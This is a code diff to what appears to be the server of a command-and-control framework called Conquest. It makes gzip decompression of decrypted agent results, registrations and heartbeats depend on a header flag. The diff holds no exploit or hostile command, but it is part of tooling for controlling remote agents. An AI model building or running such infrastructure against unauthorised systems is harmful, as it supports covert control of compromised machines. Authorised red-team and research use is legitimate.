@@ -44,11 +44,9 @@ proc deserializeTaskResult*(cq: Conquest, resultData: seq[byte]): TaskResult =
     validatePacket(header, MSG_RESULT) 
 
     # Decrypt payload 
-    let compressedPayload = unpacker.getBytes(int(header.size))
-    let decData = decrypt(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.nonce, compressedPayload, header.seqNr, header.mac)
-
-    # Decompress payload
-    let payload = uncompress(decData, dfGzip)
+    var payload = decrypt(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.nonce, unpacker.getBytes(int(header.size)), header.seqNr, header.mac)
+    if (header.flags and cast[uint16](FLAG_COMPRESSED)) != 0:
+        payload = uncompress(payload, dfGzip)
 
     # Deserialize decrypted data
     unpacker = Unpacker.init(Bytes.toString(payload))
@@ -89,11 +87,9 @@ proc deserializeNewAgent*(cq: Conquest, data: seq[byte], remoteAddress: string):
     let sessionKey = deriveSessionKey(cq.keyPair, agentPublicKey)
     
     # Decrypt payload 
-    let compressedPayload = unpacker.getBytes(int(header.size)) 
-    let decData = decrypt(sessionKey, header.nonce, compressedPayload, header.seqNr, header.mac)
-
-    # Decompress payload
-    let payload = uncompress(decData, dfGzip)
+    var payload = decrypt(sessionKey, header.nonce, unpacker.getBytes(int(header.size)) , header.seqNr, header.mac)
+    if (header.flags and cast[uint16](FLAG_COMPRESSED)) != 0:
+        payload = uncompress(payload, dfGzip)
 
     # Deserialize decrypted data
     unpacker = Unpacker.init(Bytes.toString(payload))
@@ -143,11 +139,9 @@ proc deserializeHeartbeat*(cq: Conquest, data: seq[byte]): Heartbeat =
     validatePacket(header, MSG_HEARTBEAT)
 
     # Decrypt payload
-    let compressedPayload = unpacker.getBytes(int(header.size))
-    let decData = decrypt(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.nonce, compressedPayload, header.seqNr, header.mac)
-
-    # Decompress payload 
-    let payload = uncompress(decData, dfGzip)
+    var payload = decrypt(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.nonce, unpacker.getBytes(int(header.size)), header.seqNr, header.mac)
+    if (header.flags and cast[uint16](FLAG_COMPRESSED)) != 0:
+        payload = uncompress(payload, dfGzip)
 
     # Deserialize decrypted data
     unpacker = Unpacker.init(Bytes.toString(payload))
